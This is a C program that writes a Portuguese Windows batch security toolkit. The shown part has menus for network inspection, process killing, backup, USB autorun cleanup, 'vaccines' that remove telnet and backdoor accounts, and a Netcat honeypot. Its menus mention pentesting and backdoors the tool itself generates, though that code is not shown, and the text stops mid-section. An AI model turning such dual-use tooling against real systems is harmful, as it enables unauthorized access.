#include<stdio.h>
#include<stdlib.h>
int main(){
	FILE *arqWin;
	arqWin = fopen("segurancaWindows.bat", "w");

	fprintf(arqWin,"@echo off                                                                                \n");
	fprintf(arqWin,"color 0c                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo        (  (                 )\\ )                            )     )                \n");      
	fprintf(arqWin,"echo         )\\))(   ' (         (()/(   (        (   (   (   ( /( (  ( /               \n");    
	fprintf(arqWin,"echo        ((_)()\\ )  )\\   (     /(_)) ))\\  (    ))\\  )(  )\\  )\\()))\\ ) ) /      \n");
	fprintf(arqWin,"echo         (())\\_)()((_)  )\\ ) (_)) ()/((_) )\\ /((_)(()\\((_)(_))/(()/( ()/         \n");
	fprintf(arqWin,"echo           ((_)/_/ (_) __/( /____(_____))___((_)(_))( ((_)(__)____)_)\\_             \n");
	fprintf(arqWin,"echo            / )( \\(  )(  ( \\/ ___)( __ )/ __)/ )( \\(  _  \(  (_  _) \\/ )         \n");
	fprintf(arqWin,"echo            \\ /\\ / )( /    /\\___ \\ ) _)( (__ ) \\/ ( )    / )(  )(  )  /         \n");
	fprintf(arqWin,"echo            (_/\\_)(__)\\_)__)(____/(____)\\___)\\____/(__ \\_)(__)(__)(__/          \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo        === Projeto desenvolvido por Sebastiao Alves de Almeida ===                  \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo                   === ======================================== ===                  \n");        
	fprintf(arqWin,"echo. & echo. & echo. & echo. & echo. & echo. & echo. & echo.                            \n");
	fprintf(arqWin,"pause                                                                                    \n");

	fprintf(arqWin,":1x                                                                              \n");
	fprintf(arqWin,"Title SegurnacaWindowsNET 2.0                                                         \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"color 0A                                                                         \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"echo   Ola %%USERNAME%%!   Computador: %%COMPUTERNAME%% - %%DATE%% - %%TIME%%    \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"echo   +-----------------------------+                                           \n");
	fprintf(arqWin,"echo   ^| 1 - Gerenciamento Local     ^|                    ,,,,,,               \n");
	fprintf(arqWin,"echo   ^|                             ^|                o#'9MMHb':'-,o,          \n");
	fprintf(arqWin,"echo   ^| 2 - Defesas                 ^|             .oH\":HH$'\"' '-*R-o,       \n");
	fprintf(arqWin,"echo   ^|                             ^|            dMMM*\"\"  '`' .oM\"HM?.     \n");
	fprintf(arqWin,"echo   ^| 3 - Scan e Monitoramento    ^|          ,MMM'         \"HLbd< ?&H\\    \n");
	fprintf(arqWin,"echo   ^|                             ^|         .:MH .\"\\          `MM  MM&b   \n");
	fprintf(arqWin,"echo   ^| 4 - Pentest                 ^|        . \" *H    -      &MMMMMMMMMH:   \n");
	fprintf(arqWin,"echo   ^|                             ^|        .    dboo        MMMMMMMMMMMM.   \n");
	fprintf(arqWin,"echo   ^| 5 - Clientes                ^|        .   dMMMMMMb      *MMMMMMMMMP.   \n");
	fprintf(arqWin,"echo   ^|                             ^|        .    MMMMMMMP        *MMMMMP .   \n");
	fprintf(arqWin,"echo   ^| 6 - Redes                   ^|             `#MMMMM           MM6P ,    \n");
	fprintf(arqWin,"echo   ^|                             ^|         '    `MMMP\"          HM*`,     \n");
	fprintf(arqWin,"echo   ^| 7 - Utilitarios             ^|          '    :MM             .- ,      \n");
	fprintf(arqWin,"echo   ^|                             ^|           '.   `#?..  .       ..'       \n");
	fprintf(arqWin,"echo   ^| 8 - Sobre o Script          ^|              -.   .         .-          \n");
	fprintf(arqWin,"echo   +-----------------------------+                ''-.oo,oo.-''              \n");
	fprintf(arqWin,"echo.                                                                            \n");

	fprintf(arqWin,"choice /C 123456789 /M \"Escolha uma das opcoes\"                                \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :A                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :B                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :C                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :D                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :E                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==6 goto :F                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==7 goto :G                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==8 goto :H                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==9 goto :I                                                     \n");  //l60


	fprintf(arqWin,":A                                                                               \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"echo * Gerenciamento local                                                       \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 1 - Configuracoes TCP/IP                                             \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 2 - Dados  sistema                                                   \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 3 - Gerenciar processos                                              \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 4 - Visualizar conex‰es                                              \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 5 - Visualizar o IP p£blico                                          \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 6 - Visualizar o endereco f°sico                                     \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 7 - Retornar ao menu principal                                       \n");
	fprintf(arqWin,"echo.                                                                            \n");  //l81


	fprintf(arqWin,"choice /C 1234567 /M \"Escolha uma das opcoes\"                                  \n");                         
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :AA                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :AB                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :AC                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :AD                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :AE                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==6 goto :AF                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==7 goto 1x                                                     \n");

	fprintf(arqWin,":AA                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"ipconfig /all                                                                    \n");
	fprintf(arqWin,"echo.                                                                            \n");  // l97


	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :A                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                       \n");

	fprintf(arqWin,":AB                                                                             \n");
	fprintf(arqWin,"cls                                                                             \n");
	fprintf(arqWin,"systeminfo                                                                      \n");
	fprintf(arqWin,"echo.                                                                           \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :A                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                       \n");

	fprintf(arqWin,":AC                                                                             \n");
	fprintf(arqWin,"cls                                                                             \n");
	fprintf(arqWin,"echo.                                                                           \n");
	fprintf(arqWin,"echo * Gerenciar processos                                                      \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 1 - Visualizar Processos                                            \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 2 - Finalizar processo                                              \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior                                       \n");
	fprintf(arqWin,"echo.                                                                           \n");  //l124

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1B                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :2B                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :A                                                    \n");

	fprintf(arqWin,":AD                                                                             \n");
	fprintf(arqWin,"cls                                                                             \n");
	fprintf(arqWin,"echo.                                                                           \n");
	fprintf(arqWin,"echo * Visualizar conex‰es                                                      \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 1 - Somente TCP                                                     \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 2 - TCP e UDP                                                       \n");
	fprintf(arqWin,"echo   ^|                                                                       \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior                                       \n");
	fprintf(arqWin,"echo.                                                                           \n");

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1A                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :2A                                                   \n");  
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :A                                                    \n");  //l146


	fprintf(arqWin,":AE                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"echo   Visualizar o IP publico (by Insecuritynet)                                \n");
	fprintf(arqWin,"echo. & echo. & echo.                                                            \n");
	fprintf(arqWin,"echo   Uma pagina sera aberta em seu navegador padrao, aguarde!                  \n");
	fprintf(arqWin,"echo. & echo. & echo.                                                            \n");
	fprintf(arqWin,"ping 127.0.01 -n 3 > nul                                                         \n");
	fprintf(arqWin,"start http://www.insecuritynet.com.br/ferramentas-online/meu-ip                  \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :A                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                        \n");

	fprintf(arqWin,":AF                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"getmac /v /fo list                                                               \n");
	fprintf(arqWin,"echo.                                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :A                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                        \n");  // l170


	fprintf(arqWin,":1A                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"netstat -pb TCP                                                                  \n");
	fprintf(arqWin,"echo.                                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :AC                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                        \n");

	fprintf(arqWin,":2A                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"netstat -anob                                                                    \n");
	fprintf(arqWin,"echo.                                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :AC                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                        \n");

	fprintf(arqWin,":1B                                                                              \n");
	fprintf(arqWin,"cls                                                                              \n");
	fprintf(arqWin,"echo.                                                                            \n");
	fprintf(arqWin,"echo * Visualizar Processos                                                      \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 1 - Todos os processos                                               \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 2 - Somente TCP                                                      \n");
	fprintf(arqWin,"echo   ^|                                                                        \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior                                        \n");
	fprintf(arqWin,"echo.                                                                            \n");

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1B1                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :2B2                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :AD                                                    \n"); //l208

		
	fprintf(arqWin,":2B                                                  				\n");
	fprintf(arqWin,"cls                                                 				\n");
	fprintf(arqWin,"echo.                                                 				\n");
	fprintf(arqWin,"SET /P F=Digite o nome do processo a ser finalizado:  			        \n");
	fprintf(arqWin,"echo.                                                  			        \n");
	fprintf(arqWin,"taskkill /f /im %%F%%                                    		                \n");
	fprintf(arqWin,"echo.                                                     	                \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :AD                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                       \n");

	fprintf(arqWin,":1B1                                                                            \n");
	fprintf(arqWin,"cls                                                                             \n");
	fprintf(arqWin,"echo.                                                                           \n");
	fprintf(arqWin,"tasklist | find /V \"Nome\" | find /V \"=\"                                     \n");
	fprintf(arqWin,"echo.                                                            \n");                                                 

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1B                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                        \n");

	fprintf(arqWin,":2B2                                                             \n");
	fprintf(arqWin,"cls                                                              \n");
	fprintf(arqWin,"echo.                                                            \n");
	fprintf(arqWin,"netstat -b | find /V \"Proto\" | find /V \"TCP\"                 \n");
	fprintf(arqWin,"echo.                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1B                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                        \n");             //l241



	fprintf(arqWin,":B                                                                                                     \n");
	fprintf(arqWin,"cls                                                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo * Defesas                                     ^|\\                     /)                         \n");
	fprintf(arqWin,"echo   ^|                                        /\\_\\\\__               (_//                         \n");
	fprintf(arqWin,"echo   +-^> 1 - Antiv°rus                       ^|   `^>\\-`     _._       //`)                        \n");
	fprintf(arqWin,"echo   ^|                                        \\ /` \\  _.-`:::`-._  //                             \n");
	fprintf(arqWin,"echo   +-^> 2 - Backup                            `    \\^|`    :::    `^|/                            \n");
	fprintf(arqWin,"echo   ^|                                               ^|     :::     ^|                              \n");
	fprintf(arqWin,"echo   +-^> 3 - Honeypot (Netcat)                       ^|.....:::.....^|                              \n");
	fprintf(arqWin,"echo   ^|                                               ^|:::::::::::::^|                              \n");
	fprintf(arqWin,"echo   +-^> 4 - Protecao de pasta com senha             ^|     :::     ^|                              \n");
	fprintf(arqWin,"echo   ^|                                                \\     :::     /                              \n");
	fprintf(arqWin,"echo   +-^> 5 - Protecao contra Arp Spoofing             \\ \\    :::    /                             \n");
	fprintf(arqWin,"echo   ^|                                                 `-. ::: .-'                                  \n");
	fprintf(arqWin,"echo   +-^> 6 - Revelar arquivo(s) oculto(s)       jgs     //`:::`\\\\                                 \n");
	fprintf(arqWin,"echo   ^|                                                 //   '   \\\\                                \n");
	fprintf(arqWin,"echo   +-^> 7 - Retornar ao menu principal               ^|/       \\ \\                               \n");
	fprintf(arqWin,"echo.                                                                                                  \n");

	fprintf(arqWin,"choice /C 1234567 /M \"Escolha uma das opcoes\"                                                         \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :0C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :1C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :2C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :3C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :4C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==6 goto :5C                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==7 goto :1x                                                                           \n"); //l272


	fprintf(arqWin,":0C                                                                                             \n");
	fprintf(arqWin,"cls                                                                                             \n");
	fprintf(arqWin,"echo.                                                                                           \n");
	fprintf(arqWin,"echo   Antiv°rus em batch                                                                       \n");
	fprintf(arqWin,"echo.                                                                                           \n");
	fprintf(arqWin,"echo   Atencao! O antiv°rus do WinsecurityNET n∆o elimina a necessidade                         \n");
	fprintf(arqWin,"echo   de ter um antiv°rus instalado em sua maquina!                                            \n");
	fprintf(arqWin,"echo.                                                                                           \n");
	fprintf(arqWin,"echo   Este antiv°rus tem por objetivo imunizar dispositivos de armazenamento                   \n");
	fprintf(arqWin,"echo   e neutralizar os backdoors gerados pelo WinsecurityNET ou outros com                     \n");
	fprintf(arqWin,"echo   funcoes identicas.                                                                       \n");
	fprintf(arqWin,"echo.                                                                                           \n");
	fprintf(arqWin,"echo * Antiv°rus                                                                                \n");
	fprintf(arqWin,"echo   ^|                                                                                       \n");
	fprintf(arqWin,"echo   +-^> 1 - Gerar vacina para Backdoor (conex∆o direta)                                     \n");
	fprintf(arqWin,"echo   ^|                                                                                       \n");
	fprintf(arqWin,"echo   +-^> 2 - Gerar vacina para Backdoor de Rede LAN                                          \n");
	fprintf(arqWin,"echo   ^|                                                                                       \n");
	fprintf(arqWin,"echo   +-^> 3 - Imunizar dispositivos de armazenamento                                          \n");
	fprintf(arqWin,"echo   ^|                                                                                       \n");
	fprintf(arqWin,"echo   +-^> 4 - Retornar ao menu anterior                                                       \n");
	fprintf(arqWin,"echo.                                                                                           \n");

	fprintf(arqWin,"choice /C 1234 /M \"Escolha uma das opcoes\"                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :vback                                                                \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :vbacklan                                                             \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :idda                                                                 \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :B                                                                    \n"); //l302



	fprintf(arqWin,":vback                                                                                    \n");
	fprintf(arqWin,"cls                                                                                       \n");
	fprintf(arqWin,"echo.                                                                                     \n");
	fprintf(arqWin,"echo   Vacina para Backdoor (conex∆o direta)                                              \n");
	fprintf(arqWin,"echo.                                                                                     \n");

	fprintf(arqWin,"choice /C SN /M:\"Gerar vacina agora?\"                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :vbackgo                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :0C                                                             \n");

	fprintf(arqWin,":vbackgo                                                                                  \n");
	fprintf(arqWin,"IF EXIST Vacina-Backdoor.bat GOTO :vbackgo0                                               \n");
	fprintf(arqWin,"IF NOT EXIST Vacina-Backdoor.bat GOTO :vbackgo2                                           \n");
	fprintf(arqWin,":vbackgo2                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                     \n");
	fprintf(arqWin,"echo @echo off >> Vacina-Backdoor.bat                                                     \n");
	fprintf(arqWin,"echo sc config tlntsvr start= disabled >> Vacina-Backdoor.bat                             \n");
	fprintf(arqWin,"echo net stop telnet >> Vacina-Backdoor.bat                                               \n");
	fprintf(arqWin,"echo echo. >> Vacina-Backdoor.bat                                                         \n");
	fprintf(arqWin,"echo echo   Sera preciso redefinir a senha de usuario... >> Vacina-Backdoor.bat           \n");
	fprintf(arqWin,"echo echo. >> Vacina-Backdoor.bat                                                         \n");
	fprintf(arqWin,"echo net user %%USERNAME%% * >> Vacina-Backdoor.bat                                       \n");
	fprintf(arqWin,"echo pause >> Vacina-Backdoor.bat                                                         \n");
	fprintf(arqWin,"echo exit >> Vacina-Backdoor.bat                                                          \n");
	fprintf(arqWin,"echo   \"Vacina-Backdoor.bat\" gerada com sucesso!                                        \n");
	fprintf(arqWin,"echo.                                                                                     \n");
	fprintf(arqWin,"pause                                                                                     \n");
	fprintf(arqWin,"goto :0C                                                                                  \n"); //l333


	fprintf(arqWin,":vbackgo0                                                                                \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   N∆o sera poss°vel gerar a vacina!                                                 \n");
	fprintf(arqWin,"echo   \"Vacina-Backdoor.bat\" ja existe no diret¢rio atual!                             \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"pause                                                                                    \n");
	fprintf(arqWin,"goto :0C                                                                                 \n");

	fprintf(arqWin,":vbacklan                                                                                \n");
	fprintf(arqWin,"cls                                                                                      \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   Vacina para Backdoor de Rede LAN                                                  \n");
	fprintf(arqWin,"echo.                                                                                    \n");

	fprintf(arqWin,"choice /C SN /M:\"Gerar vacina agora?\"                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :vbacklango                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :0C                                                            \n");

	fprintf(arqWin,":vbacklango                                                                              \n");
	fprintf(arqWin,"IF EXIST Vacina-Backdoor_LAN.bat GOTO :vbacklango0                                       \n");
	fprintf(arqWin,"IF NOT EXIST Vacina-Backdoor_LAN.bat GOTO :vbacklango2                                   \n");
	fprintf(arqWin,":vbacklango2                                                                             \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"set /p login2x=Digite o login:                                                           \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"set /p share2x=Digite o nome de compartilhamento:                                        \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo @echo off >> Vacina-Backdoor_LAN.bat                                                \n");                       
	fprintf(arqWin,"echo net localgroup Administradores %%login2x%% /delete >> Vacina-Backdoor_LAN.bat         \n");
	fprintf(arqWin,"echo net user %%login2x%% /delete >> Vacina-Backdoor_LAN.bat                               \n");
	fprintf(arqWin,"echo net share %%share2x%% /delete >> Vacina-Backdoor_LAN.bat                              \n");
	fprintf(arqWin,"echo pause >> Vacina-Backdoor_LAN.bat                                                    \n");
	fprintf(arqWin,"echo exit >> Vacina-Backdoor_LAN.bat                                                     \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   \"Vacina-Backdoor_LAN.bat\" gerada com sucesso!                                   \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"pause                                                                                    \n");
	fprintf(arqWin,"goto :0C                                                                                 \n");

	fprintf(arqWin,":vbacklango0                                                                             \n");
	fprintf(arqWin,"echo.                                                                                    \n");
	fprintf(arqWin,"echo   N∆o sera poss°vel gerar a vacina!                                                 \n");
	fprintf(arqWin,"echo   \"Vacina-Backdoor_LAN.bat\" ja existe no diret¢rio atual!                          \n");
	fprintf(arqWin,"echo.                                                                                     \n");
	fprintf(arqWin,"pause                                                                                     \n");
	fprintf(arqWin,"goto :0C                                                                                  \n"); //l381


	fprintf(arqWin,":idda                                                                                              \n");
	fprintf(arqWin,"cls                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   Imunizar dispositivos de armazenamento de dados                                             \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   Esta imunizacao remove os v°rus \"autorun.inf\" e \"Recycler\"                              \n");
	fprintf(arqWin,"echo   do seu dispositivo (caso tenha sido infectado) e aplica                                     \n");
	fprintf(arqWin,"echo   protecao contra esses v°rus.                                                                \n");
	fprintf(arqWin,"echo   Funciona em: HD, HD externo, pendrive, cartao de mem¢ria,                                   \n"); 
	fprintf(arqWin,"echo   SSD, Mp3, Mp4, etc.                                                                         \n");
	fprintf(arqWin,"echo.                                                                                              \n");

	fprintf(arqWin,"choice /C SN /M \"Imunizar dispositivo?\"                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :iddax                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :0C                                                                       \n");

	fprintf(arqWin,":iddax                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"SET /P digdisc= Digite a letra do dispositivo:                                                        \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"%%digdisc%%: > nul                                                                                    \n");
	fprintf(arqWin,"del /a:h autorun.inf                                                                                  \n");
	fprintf(arqWin,"rd /q /s RECYCLER                                                                                     \n");
	fprintf(arqWin,"MD AUTORUN.INF                                                                                        \n");
	fprintf(arqWin,"attrib +r +h +s \"AUTORUN.INF\"                                                                         \n");
	fprintf(arqWin,"echo NADA > RECYCLER                                                                                   \n");
	fprintf(arqWin,"attrib +r +h \"RECYCLER\"                                                                                \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   Imunizacao do dispositivo conclu°da!                                                             \n");
	fprintf(arqWin,"echo.                                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :0C                                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                            \n"); //l417


	fprintf(arqWin,":1C                                                                                              \n");
	fprintf(arqWin,"cls                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo     _________________                                                                        \n");
	fprintf(arqWin,"echo   ^|# :           : #^|                                                                      \n");
	fprintf(arqWin,"echo   ^|  :           :  ^|                                                                      \n");
	fprintf(arqWin,"echo   ^|  :  Backup   :  ^|                                                                      \n");
	fprintf(arqWin,"echo   ^|  :           :  ^|                                                                      \n");
	fprintf(arqWin,"echo   ^|  :___________:  ^|                                                                      \n");
	fprintf(arqWin,"echo   ^|     _________   ^|                                                                      \n");
	fprintf(arqWin,"echo   ^|    ^| __      ^|  ^|                                                                    \n");
	fprintf(arqWin,"echo   ^|    ^|^|  ^|     ^|  ^|                                                                  \n");
	fprintf(arqWin,"echo  \\____^|^|__^|_____^|__^|lc                                                                 \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,":bkp                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   Digite o caminho completo do diret¢rio para fazer o backup                                 \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   Exemplo: C:\\Users\\Adm\\Documents                                                         \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"set /p \"Dirbkp=>\"                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   Digite o caminho completo do diret¢rio em que sera salvo o backup                          \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   Exemplo: D:\\Documentos\\Backup                                                             \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"set /p \"Dirbkp2=>\"                                                                              \n");
	fprintf(arqWin,"xcopy %%Dirbkp%% %%Dirbkp2%% /E /H /R /Y /I /D                                                    \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C SN /M:\"Continuar o backup?\"                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :bkp                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :B                                                                      \n"); //l452


	fprintf(arqWin,":2C                                                                                                       \n");
	fprintf(arqWin,"cls                                                                                                       \n");
	fprintf(arqWin,"echo.                                                                                                     \n");
	fprintf(arqWin,"echo     _                                        _                                                       \n");
	fprintf(arqWin,"echo    ^| ^|                                      ^| ^|                                                  \n");  
	fprintf(arqWin,"echo    ^| ^|__   ___  _ __   ___ _   _ _ __   ___ ^| ^|_                                                 \n");
	fprintf(arqWin,"echo    ^| '_\\ / _\\^| '_\\ / _\\ ^| ^| ^| '_\\ / _\\^| __^|                                             \n");
	fprintf(arqWin,"echo    ^| ^| ^| ^| (_) ^| ^| ^| ^|  __/ ^|_^| ^| ^|_) ^| (_) ^| ^|_                                      \n"); 
	fprintf(arqWin,"echo    ^|_^| ^|_^|\\___/^|_^| ^|_^|\\___^|\\__, ^| .__/\\___/\\__^|                                      \n");
	fprintf(arqWin,"echo                             __/ ^| ^|                                                             \n");         
	fprintf(arqWin,"echo                            ^|___/^|_^|                                                            \n"); 
	fprintf(arqWin,"echo. & echo. & echo.                                                                                  \n");
	fprintf(arqWin,"echo   Funcionamento do honeypot: o Netcat sera executado em outra                                     \n");
	fprintf(arqWin,"echo   janela do Prompt e abrira uma porta em estado de escuta avancado.                               \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"SET /P hpdoor=Digite o nß da porta:                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M \"Ativar honeypot\"                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :honeypot                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :B                                                                              \n");

	fprintf(arqWin,":honeypot                                                                                                 \n");
	fprintf(arqWin,"C:                                                                                                        \n");
